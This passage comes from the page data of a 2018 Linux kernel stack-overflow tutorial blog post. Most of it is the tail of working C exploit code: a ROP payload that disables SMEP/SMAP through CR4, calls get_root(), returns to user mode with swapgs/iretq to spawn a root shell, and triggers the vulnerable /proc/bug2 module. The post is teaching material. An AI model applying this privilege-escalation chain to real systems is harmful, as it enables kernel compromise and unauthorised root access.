number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// need proper size of paddings just before at RIP.</span>\n        <span class=\"token comment\">/* SMEP/SMAP Bypass */</span>\n\t    <span class=\"token comment\">// 0x68,</span>\n\t    <span class=\"token number\">0x5f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc3</span><span class=\"token punctuation\">,</span>                                     <span class=\"token comment\">// pop rdi; ret;</span>\n\t    <span class=\"token number\">0xe0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 0x00000000000606e0 // SMEP/SMAP off</span>\n\t    <span class=\"token number\">0x0f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe7</span><span class=\"token punctuation\">,</span>                               <span class=\"token comment\">// mov cr4, rdi;</span>\n\t    <span class=\"token number\">0x5d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc3</span><span class=\"token punctuation\">,</span>                                     <span class=\"token comment\">// pop rbp; ret;</span>\n\t    <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// rbp</span>\n\t    <span class=\"token comment\">/* call get_root() */</span>\n\t    <span class=\"token comment\">// 0x48, 0xb8,</span>\n\t    <span class=\"token comment\">// 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, // mov rax, &amp;get_root()</span>\n\t    <span class=\"token comment\">// 0xff, 0xd0, 0x48,                               // call rax</span>\n\t    <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// &amp;get_root()</span>\n\t    <span class=\"token comment\">/* userland info */</span>\n\t    <span class=\"token number\">0x0f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span><span class=\"token punctuation\">,</span>                               <span class=\"token comment\">// swapgs;</span>\n\t    <span class=\"token number\">0x5d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc3</span><span class=\"token punctuation\">,</span>                                     <span class=\"token comment\">// pop rbp; ret;</span>\n\t    <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// rbp</span>\n\t    <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xcf</span><span class=\"token punctuation\">,</span>                                     <span class=\"token comment\">// iretq;</span>\n\t    <span class=\"token comment\">// rip = get_shell</span>\n        <span class=\"token comment\">// cs = user_cs</span>\n        <span class=\"token comment\">// rflags = user_rflags</span>\n        <span class=\"token comment\">// rsp = asm('rsp')</span>\n        <span class=\"token comment\">// ss = user_ss</span>\n\t    <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// rip     : get_shell()</span>\n\t    <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// cs      : user_cs</span>\n\t    <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// rflags  : user_rflags</span>\n\t    <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// rsp     : user_rsp</span>\n\t    <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// ss      : user_ss</span>\n\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token function\">backup_stat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// backup userland context</span>\n\t\n\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t\n\toffset <span class=\"token operator\">=</span> <span class=\"token function\">rawmemchr</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>offset<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> get_root<span class=\"token punctuation\">;</span>\n\t\n\toffset <span class=\"token operator\">=</span> <span class=\"token function\">rawmemchr</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>offset<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> get_shell<span class=\"token punctuation\">;</span>\n\t\n\toffset <span class=\"token operator\">=</span> <span class=\"token function\">rawmemchr</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>offset<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>user_cs<span class=\"token punctuation\">;</span>\n\t\n\toffset <span class=\"token operator\">=</span> <span class=\"token function\">rawmemchr</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>offset<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>user_rflags<span class=\"token punctuation\">;</span>\n\t\n\toffset <span class=\"token operator\">=</span> <span class=\"token function\">rawmemchr</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>offset<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>user_ss<span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">register</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> rsp <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rsp\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tuser_rsp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>rsp<span class=\"token punctuation\">;</span>\n\t\n\toffset <span class=\"token operator\">=</span> <span class=\"token function\">rawmemchr</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>offset<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>user_rsp<span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> shellcode<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[36m[*] Stage 2 - Trigger\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n    <span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/bug2\"</span><span class=\"token punctuation\">,</span> O_WRONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> shellcode<span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>","excerpt":"TL;DR In this article, we're going to exploit an LK module that has a stack overflow vulnerability by bypassing SMEP. Background Before we …","tableOfContents":"<ul>\n<li><a href=\"#tldr\">TL;DR</a></li>\n<li><a href=\"#background\">Background</a></li>\n<li><a href=\"#case\">Case</a></li>\n<li><a href=\"#code\">Code</a></li>\n<li><a href=\"#attack\">Attack</a></li>\n</ul>","fields":{"slug":"/2018-02-18-Stack-Overflow-Tutorial/"},"frontmatter":{"title":"Linux Kernel - Stack based Overflow Tutorial","date":"Feb 18, 2018","tags":["Security","Linux-Kernel"],"keywords":["stack-overflow","exploitation"],"update":"Feb 18, 2018"},"timeToRead":6}},"pageContext":{"slug":"/2018-02-18-Stack-Overflow-Tutorial/","series":[],"lastmod":"2018-02-18"}},"staticQueryHashes":["2027115977","2744905544","694178885"],"slicesMap":{}}